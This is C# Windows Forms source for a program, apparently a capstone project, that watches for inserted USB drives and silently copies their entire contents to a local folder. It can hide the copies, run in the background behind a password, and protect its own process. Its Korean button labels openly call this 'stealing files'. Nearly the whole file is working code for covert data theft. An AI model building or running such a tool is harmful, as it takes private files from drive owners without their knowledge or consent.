using System;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Management;
using System.Text;
using System.Net.NetworkInformation;

namespace Capstone
{
    public partial class MainForm : System.Windows.Forms.Form
    {
        PasswordForm passwordForm = new PasswordForm();
        AESEncrypt Crypt = new AESEncrypt();

        public MainForm()
        {
            InitializeComponent();
            passwordForm.VisibleChanged += new System.EventHandler(PasswordCheck);
        }

        const int RemovableDisk = 2;

        bool Start = true;
        Thread DiskAdd = null;
        ManagementObjectSearcher Mquery = new ManagementObjectSearcher("SELECT * From Win32_LogicalDisk");

        private void DiskUpdate()
        {
            var bqueryCollection = Mquery.Get();

            while (Start)
            {
                var query = new ManagementObjectSearcher("SELECT * From Win32_LogicalDisk");
                var aqueryCollection = query.Get();

                if (aqueryCollection.Count != bqueryCollection.Count)
                {
                    Start = false;
                    Mquery = query;
                    bqueryCollection = aqueryCollection;
                    DiskSelect();
                }
            }
        }

        private void DiskSelect()
        {
            var queryCollection = Mquery.Get();

            foreach (var drive in queryCollection)
            {
                switch (Convert.ToInt32(drive["DriveType"].ToString()))
                {
                    case RemovableDisk:
                        OnDriveArrived(drive["Name"].ToString());
                        break;
                }
            }

            Start = true;
        }

        private void OnDriveArrived(string diskpath)
        {
            var ThreadUSBCopy = new Thread(new ParameterizedThreadStart(copysubFolder));
            ThreadUSBCopy.Start(diskpath + "\\" + "?" + CopyPathBox.Text + "\\" + DateTime.Now.ToString().Replace(':', '.'));
        }

        private void copysubFolder(object copyInfo)
        {
            try
            {
                var copyString = Convert.ToString(copyInfo).Split('?');
                var copyFrom = copyString[0];
                var copyTo = copyString[1];
                var fromDir = new DirectoryInfo(copyFrom);
                var ParentDir = new DirectoryInfo(CopyPathBox.Text);
                var toDir = new DirectoryInfo(copyTo);
                DirectoryInfo[] fromDirs = null;

                if (!Directory.Exists(CopyPathBox.Text))
                {
                    ParentDir.Create();

                    if (Hidding.Checked)
                    {
                        ParentDir.Attributes = FileAttributes.Hidden;
                    }
                }

                toDir.Create();

                if (Hidding.Checked)
                {
                    toDir.Attributes = FileAttributes.Hidden;
                }

                fromDirs = fromDir.GetDirectories();

                var fromFile = fromDir.GetFiles();

                for (int i = 0; i < fromFile.Length; ++i)
                {
                    fromFile[i].CopyTo(toDir.ToString() + "\\" + fromFile[i].Name);

                    if (Hidding.Checked)
                    {
                        File.SetAttributes(toDir.ToString() + "\\" + fromFile[i].Name, FileAttributes.Hidden);
                    }
                }

                for (int i = 0; i < fromDirs.Length; ++i)
                {
                    copysubFolder(fromDirs[i].FullName + "?" + copyTo + "\\" + fromDirs[i].Name);
                }
            }

            catch (Exception)
            {
                return;
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            DiskAdd = new Thread(DiskUpdate);
            DiskAdd.Start();
        }

        private void FindCopyPath_Click(object sender, EventArgs e)
        {
            folderBrowserDialog.ShowDialog();

            CopyPathBox.Clear();
            CopyPathBox.Text = folderBrowserDialog.SelectedPath;
        }

        private void Backgrounding_Click(object sender, EventArgs e)
        {
            if (Backgrounding.Checked)
            {
                PasswordRequired.Enabled = true;
                PasswordRequired_Click(sender, e);
            }

            else
            {
                PasswordRequired.Enabled = false;
                PasswordBox.Enabled = false;
                SetPassword.Enabled = false;
                AcceptButton = ProgramSuspend;
                SecureIcon.Visible = false;
                InsecureIcon.Visible = true;
            }
        }

        private void PasswordRequired_Click(object sender, EventArgs e)
        {
            if (PasswordRequired.Checked)
            {
                PasswordBox.Enabled = true;
                InsecureIcon.Visible = false;
                SecureIcon.Visible = true;
                SecureIcon.Text = "Secure Enabled";
            }

            else
            {
                PasswordBox.Enabled = false;
                SetPassword.Enabled = false;
                AcceptButton = ProgramSuspend;
                SecureIcon.Visible = false;
                InsecureIcon.Visible = true;
                SecureIcon.Text = "Secure Disabled";
            }
        }

        private void PasswordBox_Enter(object sender, EventArgs e)
        {
            PasswordBox.Clear();
        }

        private void PasswordBox_TextChanged(object sender, EventArgs e)
        {
            if (PasswordBox.Text.Length == 0)
            {
                SetPassword.Enabled = false;
                AcceptButton = ProgramSuspend;
            }

            else
            {
                SetPassword.Enabled = true;
                AcceptButton = SetPassword;
            }
        }

        private void SetPassword_Click(object sender, EventArgs e)
        {
            GetPassword = Crypt.AESEncrypt256(Encoding.UTF8.GetBytes(PasswordBox.Text), NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString()).ToString();
            SetPassword.Enabled = false;
            AcceptButton = ProgramSuspend;
        }

        bool isStart = true;

        private void ProgramSuspend_Click(object sender, EventArgs e)
        {
            if (isStart)
            {
                isStart = false;
                DiskAdd.Suspend();
                ProgramSuspend.Text = "파일 계속 훔치기";
            }

            else
            {
                isStart = true;
                DiskAdd.Resume();
                ProgramSuspend.Text = "파일 훔치기 일시 정지";
            }
        }

        public static string GetPassword = null;
        bool OpenForm = false, CloseForm = false;

        private void PasswordCheck(object sender, EventArgs e)
        {
            if (GetPassword == passwordForm.TypedPassword && !passwordForm.Visible)
            {
                if (OpenForm)
                {
                    Show();
                    OpenForm = false;
                }

                else if (CloseForm)
                {
                    if (MessageBox.Show("프로그램을 종료하시겠습니까? ", "종료 확인", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.No)
                    {
                        CloseForm = false;
                    }

                    else
                    {
                        ProtectedProcess.Unprotect();
                        Application.ExitThread();
                        Environment.Exit(0);
                    }
                }
            }
        }

        private void SecureIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            OpenForm = true;

            if (PasswordRequired.Checked)
            {
                if (!Visible)
                {
                    passwordForm.Show();
                }
            }

            else
            {
                Show();
            }
        }

        private void InsecureIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            OpenForm = true;

            if (PasswordRequired.Checked)
            {
                if (!Visible)
                {
                    passwordForm.Show();
                }
            }

            else
            {
                Show();
            }
        }

        private void 열기ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenForm = true;

            if (PasswordRequired.Checked)
            {
                if (!Visible)
                {
                    passwordForm.Show();
                }
            }

            else
            {
                Show();
            }
        }

        private void 종료ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (PasswordRequired.Checked)
            {
                CloseForm = true;

                if (!Visible)
                {
                    passwordForm.Show();
                }

                else
                {
                    if (MessageBox.Show("프로그램을 종료하시겠습니까? ", "종료 확인", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes)
                    {
                        ProtectedProcess.Unprotect();
                        Application.ExitThread();
                        Environment.Exit(0);
                    }
                }
            }

            else
            {
                if (MessageBox.Show("프로그램을 종료하시겠습니까? ", "종료 확인", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes)
                {
                    ProtectedProcess.Unprotect();
                    Application.ExitThread();
                    Environment.Exit(0);
                }
            }
        }

        private void Before_MainFormClose(object sender, FormClosingEventArgs e)
        {
            if (!Backgrounding.Checked)
            {
                if (MessageBox.Show("프로그램을 종료하시겠습니까? ", "종료 확인", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.No)
                {
                    e.Cancel = true;
                }

                else
                {
                    ProtectedProcess.Unprotect();
                    Application.ExitThread();
                    Environment.Exit(0);
                }
            }

            else if (PasswordRequired.Checked && PasswordBox.Text.Length == 0)
            {
                MessageBox.Show("암호란이 공백입니다. ", "암호 입력 필요", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                e.Cancel = true;
            }

            else
            {
                Hide();
                PasswordBox.Text = GetPassword;
                SetPassword.Enabled = false;
                e.Cancel = true;
            }
        }

        private void After_MainFormClose(object sender, FormClosedEventArgs e)
        {
            if (!Backgrounding.Checked)
            {
                ProtectedProcess.Unprotect();
                Application.ExitThread();
                Environment.Exit(0);
            }
        }
    }
}